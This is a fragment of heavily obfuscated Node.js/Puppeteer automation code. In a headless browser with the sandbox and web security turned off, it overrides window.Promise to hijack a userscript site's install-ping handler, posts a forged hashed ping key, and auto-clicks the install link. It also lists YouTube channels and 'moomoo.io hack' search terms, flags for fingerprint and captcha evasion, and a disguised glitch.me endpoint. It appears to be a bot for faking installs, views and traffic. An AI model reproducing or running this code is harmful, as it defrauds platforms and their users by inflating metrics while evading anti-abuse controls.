0x7 * 0x259 + -0x2636] |= (-0x7 * -0x4fd + -0x22fd * -0x1 + -0x4568 | L >> 0xea2 + -0xeb * 0x17 + -0x687 * -0x1 & -0x8b8 + -0x1ebf + 0x27b6) << y[0x1 * 0x249e + -0x1 * -0x24af + -0x494a & N++], P[N >> -0x107 * -0x10 + 0x1193 + -0x2201] |= (0x1b4 * -0x12 + 0x1307 + 0xc21 | L >> -0x1c34 + -0x5fb * 0x5 + -0x3a21 * -0x1 & 0xc25 + -0x2181 * 0x1 + 0x159b) << y[-0x1eb0 + -0x1a7f * 0x1 + 0x3932 * 0x1 & N++], P[N >> 0x1763 + -0x8cb + -0xe96] |= (0x7f * -0x49 + 0x21ce + 0x2e9 | 0x3 * -0x34 + -0x1 * -0x2629 + -0x19 * 0x17e & L) << y[-0x7a9 + 0x1966 + -0x8dd * 0x2 & N++]);
                  }
                  this['lastByteIn' + 'dex'] = N, this['bytes'] += N - this['start'], N >= -0x2 * -0x7d7 + -0x25 * -0xc + -0x112a ? (this['block'] = P[-0x21e * -0x2 + 0x3 * -0xbe8 + 0x1f8c], this['start'] = N - (0x2b * 0x97 + 0x129 * 0x7 + -0x213c), this['hash'](), this['hashed'] = 0x1f7f + 0x1685 * -0x1 + -0x8f9) : this['start'] = N;
                }
                return this['bytes'] > 0xb143 * -0x27ccd + -0x158a43b3b + 0x501f2025 * 0xd && (this['hBytes'] += this['bytes'] / (-0x1f5b27298 + 0x169bfc5ac + 0x2 * 0xc5f95676) << -0x2501 + -0x13ef + 0x38f0, this['bytes'] = this['bytes'] % (-0x224e * -0x2464a + -0x24b10e14 + -0x478defd8 * -0x3)), this;
              }
            }
            ['finalize']() {
              if (!this['finalized']) {
                this['finalized'] = 0x8a8 + -0x1 * 0x1783 + 0xedc;
                var J = this['blocks'],
                  K = this['lastByteIn' + 'dex'];
                J[0x157 * -0x11 + -0x3 * -0x36d + 0x192 * 0x8] = this['block'], J[K >> 0x961 * -0x3 + 0xd73 + 0xeb2] |= x[-0x1 * -0x23ac + -0x44f + -0x1f5a & K], this['block'] = J[0x363 * 0x6 + 0x1 * 0xbf + 0x1 * -0x1501], K >= -0x2587 + 0x1e6b + 0x754 && (this['hashed'] || this['hash'](), J[-0x2110 + -0xb * 0x80 + 0x10 * 0x269] = this['block'], J[0x1b11 + -0x1980 + -0x181] = J[0x862 + -0x56b * -0x5 + 0x4 * -0x8de] = J[0x2492 + -0x954 + -0x1b3c] = J[-0x6 * -0x8a + -0xcc1 + 0x988] = J[0x228f + 0x15d7 * 0x1 + -0xe * 0x407] = J[0x59f * 0x3 + 0x2 * -0x4ea + 0x704 * -0x1] = J[-0x1ad0 + -0x1d0a + 0x37e0] = J[-0x13b5 * 0x1 + 0x12b9 + 0x103] = J[0x1bb * 0x2 + -0x10a2 + -0x69a * -0x2] = J[0x1811 + 0x55 * -0x1d + 0xe67 * -0x1] = J[0x3 * -0x2a4 + 0x20f7 + -0x1901] = J[0x7d * -0x42 + 0x2c3 + 0x6 * 0x4eb] = J[0x2 * 0xddd + 0x1 * -0x15fa + 0xa * -0x92] = J[0x1402 + -0x1ceb + 0x8f6] = J[-0x1545 + -0x1 * 0x187d + -0xb74 * -0x4] = J[-0x185 * -0x4 + 0x4 * 0x789 + -0x2429] = 0x1634 + 0x6 * -0x252 + -0x848), J[-0x10df + 0x184b * 0x1 + -0x75e] = this['hBytes'] << 0x7f2 + 0x26a4 + 0x2e93 * -0x1 | this['bytes'] >>> -0x20ce + 0x17d0 + 0x91b, J[-0x2 * -0x1ee + -0x1d * 0xa3 + 0xeaa] = this['bytes'] << -0x257 * -0x10 + 0xdc3 + -0x3330, this['hash']();
              }
            }
            ['hash']() {
              var J, K, L = this['h0'],
                M = this['h1'],
                N = this['h2'],
                O = this['h3'],
                P = this['h4'],
                Q = this['blocks'];
              for (J = -0x25 * -0x61 + 0x15b * -0xd + -0xe * -0x43; J < 0x116f + 0xbd1 + -0x2 * 0xe78; ++J)
                K = Q[J - (-0x4bd * 0x1 + -0x1a9 * -0x8 + 0x138 * -0x7)] ^ Q[J - (0x19 * 0xfd + 0x36f * 0xb + -0x3e72)] ^ Q[J - (-0x1518 + -0x180c + 0x2d32 * 0x1)] ^ Q[J - (0x57 * -0x48 + -0xf8d * -0x2 + -0x692)], Q[J] = K << 0x1b9 + -0x161b + -0x1 * -0x1463 | K >>> -0x1 * -0x2089 + 0x1 * 0x20ed + -0x1 * 0x4157;
              for (J = -0x1eb + -0x169 * 0x11 + 0x19e4; J < -0x3 * 0x2d3 + 0x1953 * -0x1 + 0x10f * 0x20; J += 0x160d + 0x31a + -0x1922)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x12f8 + 0x359 * -0x9 + 0xb2e | L >>> 0x29 * -0x1d + 0xeed * 0x1 + 0x5 * -0x209) + (M & N | ~M & O) + P + (0x1 * -0x5cda6aed + -0x6af87e6a + 0x1225562f0) + Q[J] << -0xf65 + 0x83 * 0x2c + 0x1 * -0x71f) << 0x1562 + 0x346 * -0x3 + -0xb8b | P >>> 0x11ab * 0x2 + 0x586 + -0x28c1 * 0x1) + (L & (M = M << -0x27 * 0xc0 + 0xe86 + 0xed8 | M >>> -0x238f + 0x13 * 0xdd + -0x2 * -0x995) | ~L & N) + O + (-0x6f785 * -0x851 + -0x7023e612 + 0x90b5e696) + Q[J + (0x6a * 0x17 + -0x3 * -0x216 + -0xfc7)] << -0x1d93 + -0x12c + 0x1ebf) << 0x935 + 0x2509 * -0x1 + 0x1bd9 | O >>> 0x7 * -0x238 + -0x278 * 0x4 + 0x1983) + (P & (L = L << -0x26bd + 0x141b * -0x1 + 0x3af6 | L >>> -0x3 * 0x45 + -0x1be4 + 0x1cb5) | ~P & M) + N + (0x5ec4d * -0x476 + 0x2745 * 0x17f3d + 0x3a2502a6) + Q[J + (0x270a + -0x18ab + -0xe5d)] << 0x1044 + -0xe7c + -0x1c8) << 0x47d + 0x2038 + 0x24b * -0x10 | N >>> -0x1d89 + 0x256 * -0x2 + 0x9 * 0x3d0) + (O & (P = P << 0x215e + 0xfc8 + 0x621 * -0x8 | P >>> 0x550 + 0x11d2 + 0xb90 * -0x2) | ~O & L) + M + (0x1690b13d + 0x19e37716 + 0x2a0e5146) + Q[J + (0x59c * 0x6 + -0x6fd * -0x3 + -0x369c)] << -0x42b * 0x7 + -0x1ab3 * -0x1 + 0x27a) << -0x1c * -0x22 + -0x18ad + 0x14fa | M >>> 0x4c * 0x2b + -0xb6 * 0x1a + 0x15 * 0x47) + (N & (O = O << -0x16ae + 0x6 * 0x62b + -0xe36 | O >>> -0x21 * 0x11 + 0x15a1 + -0x136e) | ~N & P) + L + (0x7 * 0x1860e19d + -0x49ea62ba + 0x1 * -0x6394ef8) + Q[J + (0xa53 + 0x16dc * -0x1 + 0x1b * 0x77)] << 0x7fa + 0xc9c + -0x1496, N = N << 0x1 * 0x13ea + -0x1 * 0x2b + -0x68b * 0x3 | N >>> 0x1f85 * 0x1 + 0x1c70 + -0x3bf3;
              for (; J < -0x49 * 0x67 + -0x10a0 + -0x11 * -0x2b7; J += -0x3 * -0x795 + -0x2257 + 0xb9d)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x2 * -0xd53 + -0x21f5 * -0x1 + -0x74a | L >>> -0x245d + -0x1 * 0xf58 + 0x67a * 0x8) + (M ^ N ^ O) + P + (0x848f537b + 0xa6501592 + 0xfab1fc9 * -0xc) + Q[J] << 0xe2 * -0x25 + 0x24 * 0x90 + -0xe * -0xe3) << 0x1bcc + 0x17a * 0x1a + 0xd * -0x517 | P >>> 0x95d * 0x3 + -0x476 + -0x1786) + (L ^ (M = M << 0xba2 * -0x3 + -0x1 * -0x244d + -0x1 * 0x149 | M >>> 0x2099 + 0x126c + 0x3303 * -0x1) ^ N) + O + (0x3bd68d77 * -0x3 + 0x1cd9e651 * -0x5 + 0x1b29f139b) + Q[J + (-0x266d + -0x28e * 0xf + -0x2 * -0x2660)] << -0x9da + -0x1156 + 0x2 * 0xd98) << -0x1714 + -0x1149 + -0x3 * -0xd76 | O >>> -0x2da * -0x5 + -0x23b * -0x5 + 0x1 * -0x194e) + (P ^ (L = L << 0x1b85 + 0x1 * 0x83 + -0x94e * 0x3 | L >>> 0x1 * -0x183b + 0x1 * 0x41b + 0x1422) ^ M) + N + (0x1ad3 * 0x67609 + -0x5d64eb8 + -0x389ff912) + Q[J + (-0x71 * -0x3d + 0x3 * -0x79c + 0x1 * -0x417)] << 0x17ab + -0x2543 + 0xd98) << 0x15 * -0x7c + 0xab1 * -0x1 + -0x6 * -0x37b | N >>> 0x9fb + -0x33c + 0x55 * -0x14) + (O ^ (P = P << 0x15f7 + -0x4bc + 0x111d * -0x1 | P >>> 0x7d5 * -0x1 + -0x11b * -0xc + 0x1 * -0x56d) ^ L) + M + (-0x2318cd7 * 0x21 + 0xb14 * 0x1173c2 + -0xa194dd0) + Q[J + (0x167c + 0x41b * 0x1 + -0x1a94)] << -0x1e5c + 0x1d2b + 0x131) << -0x22f8 + 0xbbd * -0x2 + -0x9 * -0x67f | M >>> 0x1c8 + -0x30 * -0x57 + -0x11fd) + (N ^ (O = O << -0x1f12 + 0x1 * -0xfd + 0x202d | O >>> 0x23fb + 0x14d8 + -0xb5d * 0x5) ^ P) + L + (0xa8d6e94e + 0x3e20fb4d + -0x781df8fa) + Q[J + (0x163e + 0x1a * -0xbf + -0x2d4)] << -0x1c * -0x8a + -0x281 * -0x1 + -0x35 * 0x55, N = N << -0x995 + -0x104a + -0x1 * -0x19fd | N >>> -0x21 * 0x81 + 0x7 * 0x371 + -0x774;
              for (; J < -0x2443 + -0xf49 + 0x33c8; J += -0x156 * -0x13 + -0x29 * 0x4 + -0x18b9)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x1 * -0xabd + 0x25a2 + -0x1ae0 | L >>> 0x1620 + -0x7d9 * 0x3 + 0x1 * 0x186) + (M & N | M & O | N & O) + P - (0x1de9cd37 * -0x3 + 0x379b098c + 0x9306a13d) + Q[J] << -0x53c + -0x829 + 0xd65) << 0x15 * -0x117 + -0xf34 + 0x12 * 0x21e | P >>> 0xff9 * 0x1 + 0x1a0a + -0x29e8) + (L & (M = M << -0x707 + 0x1 * -0xde9 + 0x150e | M >>> 0x2229 + 0x1cf1 + -0x3f18) | L & N | M & N) + O - (0x1 * -0xc7ecfed7 + -0x6c2e5f75 + 0x1a4ffa170) + Q[J + (-0x175f + -0x1e9a + 0x35fa)] << -0x2 * -0xd67 + 0xf0d * -0x2 + 0x34c) << 0x1318 + -0x8a6 * 0x2 + 0x5 * -0x5b | O >>> -0xd94 + -0xa * -0x2b4 + 0x43 * -0x33) + (P & (L = L << 0x61 + 0xe26 + 0x1 * -0xe69 | L >>> -0x17 * 0x15 + -0x1d6c + 0x1f51 * 0x1) | P & M | L & M) + N - (0x2321ae72 + 0xc3773 * 0x4eb + 0x11ade221) + Q[J + (0xb87 + 0x13d3 + -0x1f58)] << -0x29 * 0xbc + -0x138d + -0x1 * -0x31a9) << -0xbe1 * 0x3 + -0xb02 + 0xf8e * 0x3 | N >>> -0x2429 + -0x25ba + -0x9a * -0x7b) + (O & (P = P << 0x12a1 + -0x106 * 0x8 + 0x1 * -0xa53 | P >>> 0xab6 + -0x5c8 + -0x46 * 0x12) | O & L | P & L) + M - (0x494a4ec5 * 0x2 + 0x35a1570a + 0x4 * -0x15d46c5c) + Q[J + (0x2 * -0x117f + -0x171a * 0x1 + -0x5 * -0xb9f)] << 0x20 * -0x105 + 0x2399 + -0x2f9) << 0xa90 + -0x2 * -0xe7 + -0xc59 | M >>> 0x12be + 0x1 * 0x5ba + -0x237 * 0xb) + (N & (O = O << -0x7 * -0x3b9 + -0x1 * -0xf + 0x8 * -0x340 | O >>> 0x4 * -0x143 + 0x8ef + -0x3 * 0x14b) | N & P | O & P) + L - (0x1 * 0x8db32750 + -0x7be9 * -0x1892d + -0xdb1d5d21) + Q[J + (0x19ff * 0x1 + 0x15b9 * -0x1 + -0x442)] << 0xad7 + 0x2003 + -0x2ada, N = N << 0xacd + 0x6b8 + -0x1167 | N >>> -0xe64 + 0xe39 * 0x1 + 0x2d;
              for (; J < 0x3 * 0xb4b + 0x8c + -0x1 * 0x221d; J += -0x4b * 0x5d + -0x18ea * 0x1 + 0x342e * 0x1)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0xf25 * -0x1 + -0x2 * 0x628 + 0x12 * -0x28 | L >>> 0x1 * -0x99e + 0x5d5 * -0x1 + -0x16a * -0xb) + (M ^ N ^ O) + P - (0x3a330cd + -0x3e39e1c0 + -0x3de7b01 * -0x1d) + Q[J] << 0xf2c + 0xeb0 + -0x1ddc) << -0x5 * 0xcb + 0x3a * 0x81 + -0x86a * 0x3 | P >>> 0x1000 + 0x2552 + -0x3537) + (L ^ (M = M << 0x1773 + 0x1633 + 0x16c4 * -0x2 | M >>> 0x51 * 0x6 + 0x32b * 0x2 + -0x83a) ^ N) + O - (-0x195239a8 + -0x293550d1 * -0x1 + 0x25ba2701 * 0x1) + Q[J + (-0x22f5 + 0x11d + 0x21d9)] << -0x1851 + 0x24a0 + 0x89 * -0x17) << -0x8b * 0x5 + -0x2452 + 0x270e | O >>> -0x4 * -0x11e + 0x44e + 0x1 * -0x8ab) + (P ^ (L = L << 0x125a + 0x11ff + -0x243b | L >>> 0x514 * -0x4 + -0x245d + 0x12e5 * 0x3) ^ M) + N - (-0x8503eb6 * -0x7 + 0x17bbb8fd * -0x1 + 0x492ecf * 0x43) + Q[J + (0x384 + 0x2 * -0xf72 + 0x1b62)] << 0x1 * 0x183b + 0x6ed * 0x1 + -0x1f28) << 0x1600 + 0x1 * 0x238d + -0x20e * 0x1c | N >>> -0x1968 * 0x1 + 0x1a05 * 0x1 + -0x82) + (O ^ (P = P << 0x1604 * -0x1 + -0x7 * -0x282 + 0x494 | P >>> 0x513 + 0x20 * 0xd + -0x6b1) ^ L) + M - (-0x3b66335d * -0x1 + -0x482772f5 + 0x37216 * 0x1343) + Q[J + (-0x1010 + 0x2 * -0xd4b + 0x2aa9)] << 0x2199 * 0x1 + -0x134 * -0x8 + -0x2b39) << 0x2397 * 0x1 + -0x1 * -0x2411 + -0x47a3 | M >>> 0x934 + -0x29a + -0x67f * 0x1) + (N ^ (O = O << 0x1fa6 + 0x9f1 * 0x2 + -0x336a | O >>> -0x19d5 + 0x1559 + 0x47e) ^ P) + L - (0x235b * -0x1546d + -0x12fffdae + 0x77a12597) + Q[J + (0x16 * 0x89 + 0x2504 + 0x821 * -0x6)] << 0xcac + -0x169d + 0x1 * 0x9f1, N = N << 0x414 * -0x2 + -0x1 * -0x1d53 + -0x13d * 0x11 | N >>> 0x26cd + 0xea6 + -0x3571 * 0x1;
              this['h0'] = this['h0'] + L << -0x2 * 0x11dd + -0x2 * -0xe81 + 0x6b8, this['h1'] = this['h1'] + M << -0xf5c + -0x20bd + -0x6df * -0x7, this['h2'] = this['h2'] + N << -0x7d * -0x3 + 0x5ac + -0x723, this['h3'] = this['h3'] + O << 0x2350 + 0x138b * -0x1 + -0xfc5, this['h4'] = this['h4'] + P << -0x10 * 0xce + -0xb86 + 0x12 * 0x15b;
            }
            ['hex']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return w[J >> -0x1 * -0x10f5 + 0x1f5f + -0x3038 & 0x1fad + -0x1 * -0x989 + 0x5 * -0x83b] + w[J >> -0x185 * -0x1 + -0x1 * 0x1596 + 0x1 * 0x1429 & 0x191 * -0x3 + -0x823 + 0xce5] + w[J >> 0x19fc + 0x89 * -0x40 + 0x216 * 0x4 & -0x10fb + -0xccd + -0x1 * -0x1dd7] + w[J >> 0x13 * -0x74 + -0x7 * 0x410 + 0x251c & 0x208a + -0xe3 * 0x1d + 0x362 * -0x2] + w[J >> -0x13a2 + 0x11 * 0x1ae + -0x8e0 & 0x10f + -0x13 * 0x161 + 0x1933] + w[J >> 0x3fa * -0x7 + -0x145b + -0xf * -0x337 & 0x5 * -0x683 + 0x80b * 0x1 + 0xe9 * 0x1b] + w[J >> 0x1a50 + -0x1 * -0x159d + 0x37 * -0xdf & 0xd5e + 0x4 * -0x37 + -0x1 * 0xc73] + w[-0x3 * -0x8c5 + -0x1 * -0x1a56 + -0x3496 & J] + w[K >> 0x1 * 0x1779 + 0x7 * 0x51e + -0x8b * 0x6d & 0x53b + 0x445 * 0x2 + -0x82 * 0x1b] + w[K >> 0x352 + 0x1 * -0x190d + 0x15d3 & -0x23ce + -0x7 * 0x4d5 + -0x8 * -0x8b6] + w[K >> -0x3e * 0x71 + -0x657 * 0x5 + -0x7 * -0x873 & 0x1 * -0x201d + -0x1276 + 0x32a2] + w[K >> -0xb6a + -0x1 * 0x270f + -0x11 * -0x2f9 & 0x2 * 0xf2f + 0x1 * -0x9a9 + 0x6e2 * -0x3] + w[K >> -0x1296 + 0xd93 * -0x1 + 0x55 * 0x61 & -0x17 * -0x25 + 0x58 * 0x33 + -0x533 * 0x4] + w[K >> 0x24e + 0x6 * -0x5a2 + 0x64e * 0x5 & -0xac7 + -0x175b + -0x1 * -0x2231] + w[K >> 0x6 * -0x59f + 0x1be8 + -0x2 * -0x2eb & 0x340 * -0x2 + 0x3d2 * 0x3 + 0x5 * -0xfb] + w[-0x2307 + -0x1c * 0x23 + 0x125 * 0x22 & K] + w[L >> -0x1c2 * -0x14 + 0x1b0f + 0x3e1b * -0x1 & 0x1 * 0xcb + -0xf3f + -0xe83 * -0x1] + w[L >> 0xb29 + -0xf4 * -0x3 + -0xded & 0x1842 + -0x20b4 + 0x7 * 0x137] + w[L >> -0x5 * 0x16b + 0x226e + -0x1b43 & -0x1065 + -0x2220 + 0x3294] + w[L >> -0x23d3 + -0x226c + 0x464f & 0x104c + 0x1e64 + -0x2ea1] + w[L >> -0x2003 * 0x1 + 0x16d * -0x12 + -0x1 * -0x39b9 & -0x8ba + -0x14ec + -0x249 * -0xd] + w[L >> -0x15 + 0x1 * 0x56f + -0x6 * 0xe3 & -0x2458 + 0x1b32 * -0x1 + 0x3f99] + w[L >> 0x1b97 + -0x1d10 + 0x17d & -0x2b * -0x7f + 0x2 * 0x1d9 + 0xc7c * -0x2] + w[-0x16b * 0x3 + 0x24 * -0x2e + -0x1e * -0x5c & L] + w[M >> 0x1a96 + -0x17b * -0x9 + -0x27cd * 0x1 & -0x161e + -0x646 + 0x1c73 * 0x1] + w[M >> 0x134a + 0x143f + -0x17 * 0x1b7 & 0xd1 * 0x1 + 0x6d7 + 0x5 * -0x185] + w[M >> -0x1afc + 0x1094 + 0x4 * 0x29f & -0xe76 + 0xc09 + -0x13e * -0x2] + w[M >> -0x6e7 + 0x11 * -0x59 + 0xce0 & 0x1d3 + 0x235a + -0x1 * 0x251e] + w[M >> -0xb2b * 0x3 + 0xa76 + 0x1717 & 0x355 * 0x1 + -0x1f3e + 0x8 * 0x37f] + w[M >> 0x1645 * 0x1 + -0x129c + -0x3a1 & 0x224b * -0x1 + 0x85c + 0x19fe] + w[M >> -0x126 * 0x7 + 0x1819 + 0x3 * -0x559 & 0x26 * 0x33 + 0x18bc + 0x203f * -0x1] + w[0x4bb * 0x1 + 0x14 * 0x1bb + 0x18 * -0x1a3 & M] + w[N >> 0xca9 + 0x1be * -0x12 + 0x141 * 0xf & -0x247b + 0x10b6 + 0x13d4] + w[N >> 0x83 * -0x4b + -0xdf2 + 0x3 * 0x1179 & -0xa * -0x313 + -0x45 * 0xc + -0x1b73] + w[N >> -0xa * -0x2de + -0x7f7 * 0x2 + 0x1 * -0xcaa & -0xf33 + -0x10d3 + 0x1 * 0x2015] + w[N >> -0x3 * 0x2e + 0x1974 + -0x18da & -0x12 * 0x43 + 0xb15 * -0x3 + 0x3 * 0xcac] + w[N >> -0x1af2 + -0x13bb + 0x2eb9 & -0x12f5 + -0x2456 + -0xd * -0x442] + w[N >> -0x2494 + 0x13 * -0x3e + 0x2936 & -0xbe9 * -0x1 + -0x1812 + 0x2 * 0x61c] + w[N >> 0xde2 + -0x934 + -0x4aa & 0x2 * 0xc73 + 0x16b9 + -0x2f90] + w[-0x2 * 0xbbc + 0x8d * -0x42 + 0x3be1 & N];
            }
            ['digest']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return [
                J >> 0x5 * -0x262 + -0xad * 0x23 + 0x11 * 0x219 & 0x7c3 * 0x2 + -0x1 * -0xaa6 + -0x192d,
                J >> 0x5 * -0x139 + -0x1332 * -0x1 + 0xd05 * -0x1 & 0x10 * -0xe6 + 0x228e + -0x132f,
                J >> -0x4ef + 0x1 * 0x1ed + -0x2 * -0x185 & 0x14d8 + 0x1 * 0xc0d + -0x1fe6 * 0x1,
                -0xaef + -0x1fa6 + 0xae5 * 0x4 & J,
                K >> -0xbac + 0xab7 * 0x1 + -0x10d * -0x1 & 0x1cd * 0x1 + -0xf6e + -0xc * -0x138,
                K >> 0x1 * -0x9c2 + -0x1 * -0x323 + 0x6af & -0x1454 + 0x2 * -0xd46 + 0x2fdf,
                K >> 0xec3 * 0x2 + 0x9ab + 0x5 * -0x7d5 & -0x2 * 0x4cb + -0x8a1 + -0x1336 * -0x1,
                -0x9 * 0x3ed + -0x17d0 + -0xc * -0x503 & K,
                L >> 0xcd2 + -0xa8a + -0x230 & 0x11d7 + 0xe2f + -0x263 * 0xd,
                L >> 0x22 * -0x23 + -0xb * 0x1d7 + 0x851 * 0x3 & 0x1a17 + -0x13ea + -0x1 * 0x52e,
                L >> 0x264 + 0x2571 + -0x1bb * 0x17 & 0x222b + 0x1 * 0x21d9 + -0x13 * 0x387,
                -0x1a3 * 0x5 + 0x21f5 + -0x18c7 * 0x1 & L,
                M >> 0x1 * 0x2141 + -0x3e5 + 0x1 * -0x1d44 & 0xb87 + -0x301 + -0x787,
                M >> -0x233c + -0x1 * 0x20b + 0x2557 & -0x26ae + 0x11a3 * 0x1 + 0x160a,
                M >> -0x1 * 0x1c2b + 0x142f + 0x804 & -0x284 * 0x7 + -0x3a5 + -0x1 * -0x1640,
                0x632 + -0x316 * 0xa + 0x1 * 0x19a9 & M,
                N >> -0xe27 * -0x2 + -0x1d5 * 0xe + -0x2 * 0x148 & -0x16a * -0x17 + -0x341 + 0x40a * -0x7,
                N >> 0x2 * -0x6a1 + -0xfda + 0x1d2c & -0x7f2 + -0x2e9 + 0xbda,
                N >> -0xe3c + -0x6b5 + 0x14f9 & -0x1446 + 0xa27 + -0x58f * -0x2,
                0x253b + -0x124c + 0x1 * -0x11f0 & N
              ];
            }
            ['arrayBuffe' + 'r']() {
              var J, K;
              return this['finalize'](), J = new ArrayBuffer(-0x1 * -0x1dad + -0x6d * -0x2e + -0x312f), (K = new DataView(J))['setUint32'](0x1c9 * 0xe + -0xdef + 0x1 * -0xb0f, this['h0']), K['setUint32'](-0x1 * -0x2430 + 0x1a90 + -0x3ebc, this['h1']), K['setUint32'](-0xd96 + 0x3 * 0x2c6 + 0x54c, this['h2']), K['setUint32'](-0x1f2f + -0x50d * 0x3 + 0x1731 * 0x2, this['h3']), K['setUint32'](-0x5de * 0x2 + 0x167c + 0x390 * -0x3, this['h4']), J;
            }
        }
        G['prototype']['toString'] = G['prototype']['hex'], G['prototype']['array'] = G['prototype']['digest'];
        const H = C();
        window['localStora' + 'ge']['setItem']('manualOver' + 'rideInstal' + 'lJS', '1');
        let I = document['getElement' + 'sByClassNa' + 'me']('install-li' + 'nk')[-0x27b * 0x1 + -0x2644 + 0x28bf];
        return window['Promise'] = class extends window['Promise'] {
          constructor(...J) {
            let K = 0x61 * -0x41 + -0x2579 + 0x3e1a;
            J[-0x1c94 + -0x1479 + 0x310d]['toString']()['includes']('getAttribu' + 'te(\x22data-p' + 'ing-url') && (J[-0xd93 + 0x1 * -0x841 + 0x15d4] = L => {
              let M = I['getAttribu' + 'te']('data-ping-' + 'url');
              if (M) {
                let N = H(I['getAttribu' + 'te']('data-ip-ad' + 'dress') + I['getAttribu' + 'te']('data-scrip' + 't-id') + I['getAttribu' + 'te']('data-ping-' + 'key')),
                  O = new XMLHttpRequest();
                O['open']('POST', M + ('&mo=3&ping' + '_key=') + encodeURIComponent(N), 0x135 * -0x1f + -0x9 * -0x30b + 0x16f * 0x7), O['overrideMi' + 'meType']('text/plain'), O['onload'] = () => {}, O['send'](), K = 0xbba + -0x1 * 0x44f + -0x1a * 0x49;
              }
            }), K || super(...J);
          }
        }, window['setTimeout'](() => {
          I['click']();
        }, -0x25c5 + 0x1 * 0x1b55 + -0x4 * -0x413), Promise[W(0x11, 'zv[W')](-0x243d * -0x1 + -0x1 * -0x1b47 + 0x1 * -0x3f83);
      })), log('after...'), await new Promise(w => setTimeout(w, NETWORK_PATIENCE)), await s['close'](), await r['close'](), i())) : (await s['close'](), await r['close'](), i());
    }
  }
  for (let j = 0x1 * -0xf53 + 0x14 * 0x6f + 0x6a7 * 0x1; j < 0xe6f + 0x2392 + -0x19 * 0x200; j++)
    i();
}
const NETWORK_PATIENCE = 0x3c54 + 0x32ac + -0x4fc0 + (0x1f6 * -0x10 + 0x21f5 * -0x1 + 0x4d0d) * Math['random'](),
  MM_NETWORK_PATIENCE = (0x1 * 0x24f0 + 0x1e9 * 0x12 + -0x474f) * NETWORK_PATIENCE,
  url = require('url'),
  doFlags = {
    'doActivateBrowser': 0x1,
    'doGF': 0x0,
    'doSoundCloud': 0x0,
    'doYT': 0x0,
    'doMediumReader': 0x0,
    'doRemoteCaptcha': 0x0,
    'doDual': 0x0,
    'doWhitepagesMode': 0x1,
    'doMiscNetActivity': 0x1,
    'doOUJS': 0x1,
    'doCreateServer': 0x1,
    'doExtFingerprint': 0x1
  },
  {
    log: log,
    warn: warn
  } = console,
  {
    floor: floor,
    random: random,
    ceil: ceil
  } = Math;

function d(b, c) {
  const e = a();
  return d = function(f, g) {
    f = f - (0x20f8 + -0xeed * -0x2 + -0x3ed2);
    let h = e[f];
    return h;
  }, d(b, c);
}
let PROCESSED_XURL_VAL = 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/gen_dd_' + 'adkjasbdjq' + 'wkjndwqkdw' + 'qasczxhgcx' + 'zc',
  PROCESSED_SYX_VAL = 'CX001_ZCa';
const pptOptions = {
    'headless': 0x1,
    'setDefaultNavigationTimeout': 0x0,
    'setDefaultTimeout': 0x0,
    'args': [
      '--no-sandb' + 'ox',
      '--disable-' + 'setuid-san' + 'dbox',
      '--disable-' + 'dev-shm-us' + 'age',
      '--disable-' + 'web-securi' + 'ty'
    ]
  },
  axios = require('axios'),
  fetch = require('node-fetch'),
  channels = [
    'https://ww' + 'w.youtube.' + 'com/@Taskm' + 'aster',
    'https://ww' + 'w.youtube.' + 'com/@MrBea' + 'st',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCAiLfjN' + 'XkNv24uhpz' + 'UgPa6A',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCIPPMRA' + '040LQr5QPy' + 'JEbmXA',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCUaT_39' + 'o1x6qWjz7K' + '2pWcgw',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UC4-79UO' + 'lP48-QNGgC' + 'ko5p2g',
    'https://ww' + 'w.youtube.' + 'com/@quade' + 'caX8',
    'https://ww' + 'w.youtube.' + 'com/@watch' + 'er',
    'https://ww' + 'w.youtube.' + 'com/@Zyeni' + 'th',
    'https://ww' + 'w.youtube.' + 'com/@RyanG' + 'eorge',
    'https://ww' + 'w.youtube.' + X(0x19) + 'Eagle',
    'https://ww' + 'w.youtube.' + 'com/@jacks' + 'films',
    'https://ww' + 'w.youtube.' + 'com/@fanta' + 'no',
    'https://ww' + 'w.youtube.' + 'com/@NerdE' + 'xplains',
    'https://ww' + 'w.youtube.' + 'com/@HowTo' + 'Basic',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCxjrNGr' + 'X188Riipfm' + 'vejjsg'
  ];
((() => {
  Array['prototype']['repeatExte' + 'nd'] = function(h) {
    let i = this,
      j = i;
    for (let k = -0x932 * -0x1 + 0x2 * -0x45a + -0x7e; k < h; k++)
      j = j['concat'](i);
    return j;
  }, Array['prototype']['random'] = function() {
    return this[floor(random() * this['length'])];
  };
  const f = new Map();
  Array['prototype']['randomFlus' + 'h'] = function(h) {
    let i = this[floor(random() * this['length'])];
    f['has'](h) || f['set'](h, new Set());
    const j = f['get'](h);
    for (; j['has'](i);)
      j['size'] === this['length'] && j['clear'](), i = this[floor(random() * this['length'])];
    return j['add'](i), i;
  };
})());
let searchTerms = [];
searchTerms['push'](('moomoo.io,' + 'moomoo.io\x20' + 'hack,moomo' + 'o.io\x20defea' + 'ting\x20hacke' + 'rs,moomooi' + 'o,moomoo.i' + 'o\x20mods,moo' + 'moo.io\x20ins' + 'ta\x20kill,mo' + 'omoo.io\x20sa' + 'ndbox,moom' + 'oo.io\x20hack' + 's,moomoo.i' + 'o\x20base,moo' + 'moo.io\x20wor' + 'ld\x20record,' + 'moomoo.io\x20' + 'hacker,moo' + 'moo.io\x20hac' + 'k\x20link,moo' + 'moo.io\x20hig' + 'h\x20score,mo' + 'omoo.io\x20tr' + 'olling,moo' + 'moo.io\x20def' + 'eating\x20aut' + 'o\x20healers,' + 'moomoo.io\x20' + 'raiding\x20ba' + 'ses,moomoo' + '.io\x20update' + ',moomoo.io' + '\x202,moomoo.' + 'io\x20tutoria' + 'l,moomoo.i' + 'o\x20gameplay' + ',moomoo.io' + '\x20new\x20updat' + 'e,moomoo.i' + 'o\x20instakil' + 'l,moomoo.i' + 'o\x20highligh' + 